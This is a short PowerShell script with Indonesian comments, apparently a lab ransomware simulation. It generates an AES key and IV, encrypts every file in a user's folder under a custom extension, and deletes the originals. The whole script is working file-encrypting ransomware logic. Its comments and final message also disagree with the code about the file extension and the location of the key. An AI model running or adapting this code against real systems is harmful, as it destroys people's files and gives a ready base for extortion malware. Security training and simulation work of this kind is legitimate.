# 1. Generate kunci enkripsi AES dan simpan dalam bentuk file
$AesKey = New-Object Byte[] 32
[Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($AesKey)
$AesIV = New-Object Byte[] 16
[Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($AesIV)

# Simpan kunci dan IV (Initialization Vector) untuk dekripsi nanti
Set-Content -Path "C:\Users\ram-check\Downloads\Simulation-Ransomware\key.bin" -Value $AesKey -Encoding Byte
Set-Content -Path "C:\Users\ram-check\Downloads\Simulation-Ransomware\iv.bin" -Value $AesIV -Encoding Byte

# 2. Fungsi untuk mengenkripsi file dengan AES
function Encrypt-File {
    param (
        [string]$InputFilePath,
        [byte[]]$AesKey,
        [byte[]]$AesIV
    )

    # Baca isi file
    $FileBytes = [System.IO.File]::ReadAllBytes($InputFilePath)

    # Buat objek AES
    $Aes = [System.Security.Cryptography.Aes]::Create()
    $Aes.Key = $AesKey
    $Aes.IV = $AesIV

    # Encryptor
    $Encryptor = $Aes.CreateEncryptor()

    # Proses enkripsi
    $EncryptedBytes = $Encryptor.TransformFinalBlock($FileBytes, 0, $FileBytes.Length)

    # Simpan file terenkripsi (dengan ekstensi .bbga4a1)
    $EncryptedFilePath = "$InputFilePath.bbg4a1s"
    [System.IO.File]::WriteAllBytes($EncryptedFilePath, $EncryptedBytes)

    # Hapus file asli
    Remove-Item $InputFilePath
}

# 3. Proses enkripsi semua file dalam folder
$FolderPath = "C:\Users\ram-check\Downloads\File"
$Files = Get-ChildItem -Path $FolderPath -File

foreach ($File in $Files) {
    Encrypt-File -InputFilePath $File.FullName -AesKey $AesKey -AesIV $AesIV
}

Write-Host "Enkripsi selesai. Kunci disimpan di C:\encryption\key.bin dan iv.bin."
